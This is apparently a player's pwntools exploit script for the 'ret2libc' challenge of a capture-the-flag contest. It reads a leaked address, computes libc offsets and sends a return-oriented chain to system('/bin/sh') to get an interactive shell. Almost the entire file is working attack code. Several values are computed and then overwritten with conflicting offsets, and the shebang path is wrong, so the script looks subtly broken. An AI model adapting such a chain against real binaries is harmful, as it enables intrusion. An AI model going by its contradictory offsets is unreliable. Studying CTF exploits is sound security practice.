#!user/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'

local=True
if(local):
    io = process(exe)
else:
    io = remote('ret2libc-pwn.wanictf.org', 9007)

# =========================================================
#                         ADDRESSES
# =========================================================
# libc = ELF('./libc.so.6')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
exe = ELF('./chall')
ropelf = ROP(exe)
roplibc = ROP(libc)
ret = ropelf.find_gadget(["ret"])[0]
# pop_rdi = roplibc.find_gadget(["pop rdi", "ret"])[0]
pop_rdi = 0x27725
binsh = 0x1d8698

# =========================================================
#                         EXPLOITS
# =========================================================

# Got manually through cyclic gdb-pwndbg
offset = 40

io.recvuntil(b'+0x28')
leak = int(io.recvline().strip().ljust(8, b"\n")[2:20].decode(), 16)
log.info(f"{hex(leak)=}")

libc_base = leak + 0x251a6
log.info(f"{hex(libc_base)=}")

pop_rdi = libc_base + pop_rdi
# system_addr = libc_base + 0x50d60
system_addr = libc_base + 0x052290

system_addr = leak + 0x251a6
log.info(f"{hex(system_addr)=}")
pop_rdi = leak + 0x59b
log.info(f"{hex(pop_rdi)=}")
binsh = leak + 0x16eea7
log.info(f"{hex(binsh)=}")

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())
gdb.attach(io, gdbscript=gdbscript)

# 2nd payload to get shell
payload = flat({
    offset: [
        pop_rdi,
        binsh,
        ret,
        system_addr
    ]
})

# # send 2nd payload to get shell
io.sendlineafter(b'your input (max. 128 bytes) > ', payload)

io.interactive()